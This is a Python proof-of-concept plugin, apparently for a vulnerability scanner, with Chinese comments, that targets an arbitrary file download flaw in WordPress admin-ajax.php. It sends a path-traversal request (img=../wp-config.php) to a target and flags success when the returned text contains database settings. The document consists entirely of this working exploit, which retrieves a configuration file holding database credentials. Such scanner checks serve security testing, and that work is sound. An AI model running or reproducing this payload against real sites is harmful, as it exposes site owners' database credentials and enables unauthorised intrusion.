# Author:w8ay
# Name:测试DEMO
'''
name: wordpress admin-ajax.php任意文件下载
referer: unknown
author: Lucifer
description: 文件admin-ajax.php中,参数img存在任意文件下载漏洞。
'''

import HackRequests


def poc(arg, **kwargs):
    payload = "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
    vulnurl = arg + payload
    try:
        hack = HackRequests.hackRequests()
        hh = hack.http(vulnurl)

        if r"DB_NAME" in hh.text():
            result = {
                "name": "wordpress file downloader",  # 插件名称
                "content": "存在wordpress admin-ajax.php任意文件下载漏洞",  # 插件返回内容详情，会造成什么后果。
                "url": vulnurl,  # 漏洞存在url
                "log": hh.log,
                "tag": "任意下载"  # 漏洞标签
            }
            return result
    except:
        pass


if __name__ == "__main__":
    pass